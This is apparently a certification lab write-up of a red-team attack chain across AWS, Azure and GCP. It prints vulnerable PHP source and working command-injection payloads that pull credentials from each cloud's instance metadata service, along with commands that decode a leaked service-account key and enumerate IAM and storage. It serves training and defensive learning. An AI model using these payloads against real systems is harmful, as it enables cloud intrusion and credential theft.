# MCRTA — Multi-Cloud Red Teaming Assessment: Technical Write-up

**Certification:** MCRTA (Multi-Cloud Red Teaming Assessment)
**Author:** Cybrg (Og'abek Sobirjonov)
**Scope:** AWS, Azure, GCP — full attack chain from OSINT to IAM/resource extraction

---

## Methodology Overview

The attack lifecycle across all three cloud modules followed a consistent pattern:

```
OSINT → Exposed Asset Discovery → SSRF/RCE on Web App → Metadata Credential Theft
      → IAM Enumeration → Sensitive Resource Access
```

While the underlying theory stays the same, executing this chain across AWS, Azure, and GCP
simultaneously highlights how differently each provider implements IAM, instance metadata, and
authentication — which is really the point of the exam.

---

## Module 1 — AWS Cloud Red Teaming

### Step 1: OSINT — Finding the S3 Bucket

The engagement starts with a prompt to locate the S3 bucket belonging to the `cwl-metatech`
organization. Direct guesses failed:

```bash
curl https://cwl-metatech.s3.amazonaws.com        # NoSuchBucket
curl https://s3.amazonaws.com/cwl-metatech          # NoSuchBucket
```

Used `cloud_enum` to brute-force bucket naming permutations across cloud providers:

```bash
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install awscli --break-system-packages
python3 cloud_enum.py -k cwl-metatech --disable-azure --disable-gcp
```

Within a few minutes, three candidate buckets surfaced:

```
Protected S3 Bucket: http://cwl-metatech1.s3.amazonaws.com/
Protected S3 Bucket: http://cwl-metatech-pro.s3.amazonaws.com/
OPEN S3 BUCKET:      http://cwl-metatech-prod.s3.amazonaws.com/
```

**Flag 1:** `http://cwl-metatech-prod.s3.amazonaws.com/`

### Step 2: Reading the Bucket

```bash
aws s3 ls s3://cwl-metatech-prod --no-sign-request --recursive
```

```
dev-server-ip.txt   (14 bytes)
prod-data.txt       (279 bytes)
staging-data.txt    (227 bytes)
```

```bash
aws s3 cp s3://cwl-metatech-prod/dev-server-ip.txt - --no-sign-request
aws s3 cp s3://cwl-metatech-prod/prod-data.txt - --no-sign-request
aws s3 cp s3://cwl-metatech-prod/staging-data.txt - --no-sign-request
```

`dev-server-ip.txt` returned the dev server's EC2 public IP. `prod-data.txt` contained user PII
(names + payment card data), which answers **Flag 10** immediately.

### Step 3: Finding the SSRF Vulnerability

The dev server hosted a small PHP app, "URL Score Calculator." Recon of the app surfaced two
pages with URL-style inputs — `score.html` (→ `calculate_score.php`) and `update.html`
(→ `process.php`).

Initial testing of `calculate_score.php`'s `url` parameter looked promising at first glance — the
response echoed the submitted URL back — but repeated identical requests returned **different,
random scores each time** (459 → 35 → 566 for the same input), proving the "score" has no
relationship to the actual fetched content. It's a decorative dead end, not a real SSRF primitive.

The real vulnerability was found by dumping the exposed `.git` directory on the dev server:

```bash
pip3 install git-dumper --break-system-packages
mkdir /tmp/gitdump
git-dumper http://DEV_SERVER_IP/.git /tmp/gitdump
cat /tmp/gitdump/process.php
```

Source review revealed two vulnerabilities side by side:

```php
// SSRF
$ip = $_POST['ip'];
$content = file_get_contents($ip);

// RCE (command whitelist bypassable by crafting payload args)
$org = trim($_POST['organization'] ?? '');
$allowed = ["ls", "hostname", "curl", "cat"];
$parts = explode(" ", $org);
$main_cmd = $parts[0];
if (in_array($main_cmd, $allowed)) {
    ob_start();
    system($org);
    $org_output = ob_get_clean();
} else {
    $org_output = "Command not allowed!";
}
echo $org_output, $content;
```

**Flag 2:** `ip` — the real SSRF parameter in `process.php`

> **Lesson:** the obviously-named "URL" field on the surface page (`calculate_score.php`) was a
> red herring. The actual vulnerable parameter lived in a second form backed by a different
> script, and was only confirmed by reading source — not by guessing from the UI.

### Step 4: Stealing EC2 Credentials via Instance Metadata

With `curl` whitelisted in the RCE, the metadata service (reachable only from inside the
instance) becomes accessible by chaining through the RCE rather than the SSRF directly:

```bash
# Enumerate the attached IAM role
curl -s -X POST "http://DEV_SERVER_IP/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

This returned the IAM role name attached to the instance — **Flag 3**.

```bash
# Pull temporary credentials for that role
curl -s -X POST "http://DEV_SERVER_IP/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'
```

Response is a JSON blob with `AccessKeyId`, `SecretAccessKey`, and `Token`:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_DEFAULT_REGION="us-east-2"

aws sts get-caller-identity
```

### Step 5: IAM Enumeration

With valid temporary credentials, the remaining flags fall through standard IAM recon:

```bash
aws iam list-users
aws iam list-groups

# Flag 4 — members of the "interns" group
aws iam get-group --group-name interns

# Flag 5 — which group does emp003 belong to
aws iam list-groups-for-user --user-name emp003

# Flags 6 & 7 — Trust Policy details on crossaccount-role / dev-role
aws iam list-roles

# Flag 8 — inline policy on emp001
aws iam list-user-policies --user-name emp001

# Flag 9 — managed policy ARN on the employees group
aws iam list-attached-group-policies --group-name employees
```

For Flags 6/7, the answers live inside the **Trust Policy** documents returned by
`list-roles` — specifically the `crossaccount-role` (Principal ARN → account ID) and the
`dev-role` (Principal → which role can assume it).

---

## Module 2 — Azure Cloud Red Teaming

### Step 1: Subdomain Discovery

```bash
gobuster dns --domain meta-tech.cloud \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --threads 20 --resolver 8.8.8.8 --timeout 5s 2>/dev/null | grep -v ERROR
```

Two subdomains resolved: `www.meta-tech.cloud` and `internal.meta-tech.cloud`. The latter
pointed to an Azure IP and hosted the vulnerable app.

**Flag 1:** `internal.meta-tech.cloud`

### Step 2: Exploiting the HR Portal

`http://internal.meta-tech.cloud/CSP-1/` hosted an HR Portal with the same `.git` exposure and
identical `process.php` vulnerability pattern (SSRF via `ip`, RCE via `organization`).

### Step 3: Getting the Azure JWT Token

Azure's IMDS requires a `Metadata: true` header. The `resource=` parameter also contains an `&`
that the shell interprets as a background operator — `--data-urlencode` handles this safely:

```bash
# Management API token
curl -s -X POST "http://internal.meta-tech.cloud/CSP-1/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'

# Microsoft Graph token (needed for Flags 8–10)
curl -s -X POST "http://internal.meta-tech.cloud/CSP-1/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"'
```

> `process.php` concatenates RCE output with SSRF content, so the JSON response is duplicated.
> Parse only the first object:

```python
import sys, json
raw = sys.stdin.read()
decoder = json.JSONDecoder()
obj, _ = decoder.raw_decode(raw)
print(obj['access_token'])
```

### Step 4: Decoding the JWT

```bash
echo "PAYLOAD_HERE" | base64 -d 2>/dev/null | python3 -m json.tool | grep '"iss"\|"tid"'
```

**Flag 2** (`iss` claim): `https://sts.windows.net/TENANT_ID/`
**Flag 3** (Tenant ID): the GUID inside that URL / the `tid` field

**Flag 4** (Subscription ID) comes from the instance metadata endpoint:

```bash
--data-urlencode 'organization=curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"'
```

Look for `subscriptionId` in the response.

### Step 5: Azure Resource & RBAC Enumeration

```bash
MGMT_TOKEN="..."
SUB="SUBSCRIPTION_ID"
OID="VM_IDENTITY_OID"   # the "oid" field in the JWT

# Flag 5 — role assigned to the VM identity at subscription scope
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$OID'" \
  | python3 -m json.tool

# Resolve roleDefinitionId → human-readable name
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/ROLE_GUID?api-version=2022-04-01" \
  | python3 -m json.tool | grep roleName

# Flags 6 & 7 — custom-role-definition
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01&\$filter=roleName+eq+'custom-role-definition'" \
  | python3 -m json.tool
```

**Flag 6** (scope of the custom role assignment) required listing all role assignments and
filtering for the custom role GUID:

```bash
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=atScope()" \
  | python3 -c "
import sys,json
data=json.load(sys.stdin)
for v in data.get('value',[]):
    if 'CUSTOM_ROLE_GUID' in v['properties']['roleDefinitionId']:
        print('SCOPE:', v['properties']['scope'])
"
```

> The scope resolved to a specific VM resource path rather than the whole subscription — easy to
> miss if you stop at the subscription-level listing.

For Flags 8–10, the Graph token is required:

```bash
GRAPH_TOKEN="..."

# Flag 8 — IT Ops group membership
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?\$filter=displayName+eq+'IT+Ops'" | python3 -m json.tool
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/GROUP_ID/members?\$select=displayName,mail,userPrincipalName" \
  | python3 -m json.tool

# Flag 9 — prod-app owner
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications?\$filter=displayName+eq+'prod-app'" | python3 -m json.tool
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/APP_OBJECT_ID/owners?\$select=displayName,userPrincipalName" \
  | python3 -m json.tool

# Flag 10 — dev-app Graph API permission
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications?\$filter=displayName+eq+'dev-app'" | python3 -m json.tool

# resourceAppId 00000003-0000-0000-c000-000000000000 = Microsoft Graph itself
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId+eq+'00000003-0000-0000-c000-000000000000'&\$select=appRoles,oauth2PermissionScopes" \
  | python3 -c "
import sys,json
data=json.load(sys.stdin)
sp=data['value'][0]
target='PERMISSION_GUID'
for r in sp['appRoles']:
    if r['id']==target: print('AppRole:', r['value'])
for s in sp['oauth2PermissionScopes']:
    if s['id']==target: print('Scope:', s['value'])
"
```

---

## Module 3 — GCP Cloud Red Teaming

### Step 1: GitHub OSINT — The Leaked Service Account Key

The hint pointed at `org:cwl-metatech` — but `cwl-metatech` is a GitHub **user**, not an org.
Searching repositories under that user returned one result:

```
https://github.com/cwl-metatech/production-data
```

**Flag 1:** `https://github.com/cwl-metatech/production-data`

Inside, `pipeline.yml` loaded an `ENCRYPTED_GCP_KEY` CI/CD variable — base64-encoded, not
actually encrypted:

```bash
curl -s "https://raw.githubusercontent.com/cwl-metatech/production-data/main/pipeline.yml" \
  | grep -oP '(?<=ENCRYPTED_GCP_KEY=")[^"]+' \
  | tr -d '"' | base64 -d | python3 -m json.tool | grep "project_id\|client_email"
```

**Flag 2** (Project ID) is in the decoded JSON's `project_id` field. The key belongs to
`dev-service-account@PROJECT_ID.iam.gserviceaccount.com`.

### Step 2: Authenticating with `gcloud`

```bash
curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-linux-x86_64.tar.gz
tar -xf google-cloud-cli-linux-x86_64.tar.gz
./google-cloud-sdk/install.sh --quiet
export PATH=$PATH:/root/google-cloud-sdk/bin
```

The private key in the decoded JSON stores literal `\n` strings instead of real newlines — fix
before authenticating:

```bash
curl -s "https://raw.githubusercontent.com/cwl-metatech/production-data/main/pipeline.yml" \
  | grep -oP '(?<=ENCRYPTED_GCP_KEY=")[^"]+' | tr -d '"' | base64 -d \
  | python3 -c "
import sys,json
raw=sys.stdin.read()
data=json.loads(raw)
data['private_key'] = data['private_key'].replace('\\\\n', '\n')
print(json.dumps(data, indent=2))
" > /tmp/dev-sa-key.json

gcloud auth activate-service-account --key-file=/tmp/dev-sa-key.json
gcloud config set project PROJECT_ID
```

### Step 3: Compute Instance Enumeration

```bash
# Flag 3 — compute instance name
gcloud compute instances list --project PROJECT_ID

# Flag 4 — service account attached to the instance
gcloud compute instances describe INSTANCE_NAME \
  --zone ZONE --project PROJECT_ID \
  --format="get(serviceAccounts)"
```

### Step 4: Pivoting to the VM — Getting the Metadata Token

The dev service account can't read the project IAM policy directly, but the compute instance at
its external IP runs the same URL Score Calculator / HR Portal app pattern seen in the other
modules. GCP's metadata endpoint requires its own distinct header:

```bash
curl -s -X POST "http://INSTANCE_EXTERNAL_IP/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"'
```

Store the `access_token` as `$VM_TOKEN`.

### Step 5: GCP IAM and Storage Enumeration

```bash
# Flags 5, 6, 7 — project IAM policy
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy" \
  -X POST -H "Content-Type: application/json" -d "{}" | python3 -m json.tool
```

The bindings reveal:
- Which service account holds the custom `VMRead*` role (**Flag 6**)
- Which role the VM's own service account has at project level (**Flag 5**)

```bash
# Flag 7 — permission inside the custom role
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://iam.googleapis.com/v1/projects/PROJECT_ID/roles/CUSTOM_ROLE_NAME" \
  | python3 -m json.tool | grep includedPermissions -A5
```

```bash
# Flag 8 — instance-level IAM policy (requires the dev SA creds, not the VM token)
gcloud compute instances get-iam-policy INSTANCE_NAME \
  --zone ZONE --project PROJECT_ID
```

```bash
# Flag 9 — list storage buckets
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID" \
  | python3 -m json.tool | grep '"name"'

# list objects in the bucket
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o" \
  | python3 -c "import sys,json; [print(o['name']) for o in json.load(sys.stdin).get('items',[])]"

# Flag 10 — read the target file
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o/FILENAME?alt=media"
```

---

## Key Takeaways

- **The metadata service is the crown jewel.** All three providers expose temporary credentials
  through the link-local address `169.254.169.254`, reachable only from inside the instance. Any
  SSRF/RCE that can reach it should be treated as **critical severity**, not medium.

- **Git history doesn't lie.** Both the AWS and Azure instances had `.git` exposed. Commit
  history showed messages like `"Delete dev-service-account-key.json"` — the file content
  persists in history even after deletion. Always check `git log` and `git show <commit>`.

- **The obvious parameter isn't always the vulnerable one.** `calculate_score.php`'s `url` field
  looked like the SSRF candidate but only returned a random, content-independent score. The real
  vulnerability was `process.php`'s `ip` parameter — found only by reading source, whether via
  `.git` exposure or (in principle) via the SSRF itself using `file://`.

- **Provider header requirements differ:**
  | Provider | Metadata header required |
  |---|---|
  | AWS (IMDSv1) | None |
  | Azure | `Metadata: true` |
  | GCP | `Metadata-Flavor: Google` |

- **Tokens expire.** Azure and GCP temporary tokens typically expire within an hour — re-fetch
  and re-export if commands start returning 401s mid-enumeration.

---

## Skills Demonstrated

- Cloud asset OSINT (`cloud_enum`, GitHub recon, DNS subdomain brute-forcing)
- S3 bucket misconfiguration exploitation
- Source code recovery via exposed `.git` directories (`git-dumper`)
- SSRF and command injection identification/exploitation in PHP applications
- Cloud instance metadata service (IMDS) abuse across AWS, Azure, and GCP
- IAM/RBAC enumeration and policy analysis across three distinct cloud IAM models
- JWT decoding and claims analysis
- REST API interaction with Azure Resource Manager, Microsoft Graph, and GCP APIs

---

*Write-up based on hands-on lab completion for the MCRTA certification. Target names, IPs, and
IDs specific to the lab environment have been generalized where appropriate.*
